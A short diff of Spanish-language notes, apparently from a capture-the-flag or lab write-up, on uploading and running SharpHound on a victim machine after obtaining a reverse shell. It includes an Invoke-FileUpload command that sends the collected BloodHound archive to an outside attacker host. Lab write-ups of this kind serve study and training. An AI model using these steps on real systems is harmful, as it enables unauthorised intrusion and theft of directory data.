@@ -174,8 +174,8 @@ después de crear el shortcut solo debemos esperar para obtener la reverse shell
 subimos el `SharpHound.exe` a la maquina victima
 ![[Pasted image 20240629124118.png]]
 
-luego usando el 
-
+ejecutamos el `./SharpHound.exe` y luego usando el `PSU`
+![[Pasted image 20240629132729.png]]
 
 Invoke-FileUpload -Uri http://10.10.14.47:8000/upload -File "20240629101749_BloodHound.zip"
 
